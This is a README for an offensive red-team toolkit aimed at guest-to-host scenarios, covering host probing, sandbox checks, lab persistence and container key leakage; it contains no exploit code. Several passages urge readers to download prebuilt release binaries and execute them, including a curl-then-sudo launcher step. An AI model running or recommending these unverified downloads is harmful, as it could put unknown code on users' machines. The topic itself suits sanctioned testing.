# Restless Guest Offensive Toolkit — DEFCON33 Red Team Kit

[![Releases](https://img.shields.io/badge/Release-download-blue?logo=github&style=for-the-badge)](https://github.com/SK8Demons/restless-guest/releases)

An offensive toolkit for restless guests. Designed for red teamers, researchers, and contest players. Built for live testing, host discovery, and proof-of-concept workflows at DEFCON33. Use the assets in the Releases page to run payloads and demos.

![Restless Guest](https://raw.githubusercontent.com/SK8Demons/restless-guest/main/assets/banner.png)

Table of contents
- About 🎯
- Key features ⚙️
- Threat model & use cases 🧭
- Components and layout 🧩
- Quickstart — download & run ▶️
- Example workflows 🛠️
- Commands and flags ⚡
- Troubleshooting tips 🔍
- Development guide 💻
- Contributing & credits 🤝
- License 📄

About 🎯
This toolkit collects scripts, payloads, and automation for "restless guest" scenarios. It focuses on interactions where an untrusted or ephemeral guest process or VM interacts with a host stack. The project bundles techniques for surface discovery, lateral probing, and controlled persistence. The tools work on modern Linux and Windows targets in lab environments.

Key features ⚙️
- Host probe suite for service and port discovery.
- Privilege checkers and sandbox indicators.
- Temporary persistence mechanisms for labs.
- Safe, repeatable payloads for demo and capture-the-flag.
- Modular plugins for new vectors.
- Automation scripts for large-scale validation runs.
- CI-friendly artifacts in Releases.

Threat model & use cases 🧭
- Red teams running short engagement tracks.
- CTF players validating exploit chains.
- Researchers mapping guest-to-host vectors.
- Blue teams testing detection for guest-origin activity.

This toolkit assumes a lab or sanctioned testbed. It exposes vectors that mirror class scenarios found in modern virtualization and container hosting.

Components and layout 🧩
- core/
  - launcher.sh — orchestrates modules.
  - host_probe/ — service and port probes.
  - indicator/ — checks for sandbox indicators.
- payloads/
  - demo-linux.bin — sample ELF payload.
  - demo-win.exe — sample PE payload.
- plugins/
  - vm_escape/ — experimental helpers.
  - container_walk/ — container-aware checks.
- docs/
  - scenarios.md — step-by-step use cases.
  - io_map.md — input/output mapping for modules.
- assets/
  - banner.png — visual header.
  - diagram.png — architecture diagram.

Quickstart — download & run ▶️
Use the Releases page to get the latest build and artifacts.

Download the file at:
https://github.com/SK8Demons/restless-guest/releases

The Releases entry contains compiled artifacts and scripts. Download the asset that matches your platform and execute it on your test machine. Example commands:

- Linux (example)
  - curl -L -o restless.tar.gz "https://github.com/SK8Demons/restless-guest/releases/download/v1.0/restless-guest-linux.tar.gz"
  - tar xzf restless.tar.gz
  - cd restless-guest
  - sudo ./launcher.sh

- Windows (example)
  - Download the EXE from the Releases page.
  - Open PowerShell in the download folder.
  - .\demo-win.exe

The Releases page holds the signed and archived release assets. Visit the Releases link above to pick the correct file and follow the platform-specific steps.

Example workflow — host probe and demo run 🛠️
1. Prepare a lab VM with a host and a guest.
2. Place the demo payload in the guest environment.
3. Run the host probe from the guest:
   - ./core/host_probe/scan.sh --target 10.0.0.1
4. Review scan output in core/host_probe/results.json
5. Launch the demo payload:
   - sudo ./payloads/demo-linux.bin --mode demo
6. Capture logs and save them in logs/

Workflows focus on repeatable steps and simple outputs. The tools produce JSON logs for parsers and dashboards.

Commands and flags ⚡
Core launcher
- ./launcher.sh --module <name> --target <ip>
- Modules list: host_probe, indicator, payload_runner

Host probe
- ./core/host_probe/scan.sh --target <ip> --ports 1-65535 --timeout 3
- Output: results.json

Indicator checks
- ./core/indicator/check.sh --verbose
- Checks: CPU model, hypervisor flags, mounted filesystems, container cgroup tags

Payload runner
- ./core/payloads/run.sh --payload ./payloads/demo-linux.bin --args "--mode demo"
- Use a wrapper to capture stdout/stderr to log files.

Troubleshooting tips 🔍
- If a module fails to start, check file permissions with ls -l.
- Ensure network interfaces are up and routes are correct.
- For missing libraries, use ldd or Dependency Walker to inspect binary dependencies.
- Run with strace or Process Monitor to record syscalls when you debug a failing run.

Architecture diagram
![Architecture diagram](https://raw.githubusercontent.com/SK8Demons/restless-guest/main/assets/diagram.png)

Integration and automation
- The project supports CI builds that generate release artifacts.
- Use the provided Dockerfile to run the core set in a container:
  - docker build -t restless-guest:ci .
  - docker run --rm -it restless-guest:ci ./launcher.sh --module host_probe

Testing strategy
- Unit tests cover parsing and sanitizer modules.
- Integration tests run on isolated VMs via QEMU/KVM.
- Stress tests run probes against a lab service farm.

Development guide 💻
- Fork the repo and open a feature branch for changes.
- Follow the commit message format: type(scope): short summary
  - Example: feat(host_probe): add UDP port scanning
- Write tests for logic changes. Place tests in tests/ matching the module.
- Run local linters:
  - shellcheck for shell scripts
  - go vet and go fmt for Go modules
  - bandit for Python modules

Plugin system
- Plugins live in plugins/<name>.
- Each plugin exports a manifest.json:
  - name, version, entrypoint, required-perms
- The launcher loads plugins by scanning plugins/* and executing entrypoint scripts.

CI & Releases
- The main CI pipeline builds artifacts and uploads ZIP/tarball bundles.
- Release assets include signed checksums and a manifest.
- Visit Releases to download the build you need:
  https://github.com/SK8Demons/restless-guest/releases

Examples and demos
- Demo 1: Guest-to-host TTL leak
  - Steps: run host_probe with TTL check, send crafted packets, observe host responses.
- Demo 2: Container-aware file leakage
  - Steps: run container_walk, enumerate shared mounts, check for exposed keys.
- Demo 3: Minimal persistence for short engagements
  - Steps: run payload_runner with an ephemeral timer and auto-clean hooks.

Data formats
- All outputs use JSON or newline-delimited JSON for easy parsing.
- Logs include a top-level "run_id" and timestamp fields.
- Example result:
  {
    "run_id":"abc123",
    "module":"host_probe",
    "target":"10.0.0.1",
    "open_ports":[22,80,443],
    "timestamp":"2025-08-19T12:00:00Z"
  }

Security controls
- Modules mark results with sensitivity tags: public, internal, secret.
- Use the built-in sanitizer to remove PII from logs before sharing.
- The toolkit uses minimal external dependencies to reduce supply-chain risk.

Contributing & credits 🤝
- PRs should target the develop branch.
- Open issues for bugs or feature ideas.
- Use descriptive titles and reference related issues in PRs.
- Major contributors:
  - SK8Demons — lead design and builds
  - Community contributors — modules and plugins

Community
- Report issues on the repository.
- Submit pull requests for new techniques or fixes.
- Share workflows in issues or PR descriptions.

Badges & visuals
[![Release](https://img.shields.io/github/v/release/SK8Demons/restless-guest?style=flat-square)](https://github.com/SK8Demons/restless-guest/releases)
![DEFCON](https://raw.githubusercontent.com/SK8Demons/restless-guest/main/assets/defcon-badge.png)

Legal & license 📄
- This project uses a permissive open source license. See the LICENSE file for full terms.

Credits
- Original toolkit design at DEFCON33.
- Thanks to testers, red teamers, and CTF players for feedback.

Download the release assets and execute the build for your platform:
https://github.com/SK8Demons/restless-guest/releases

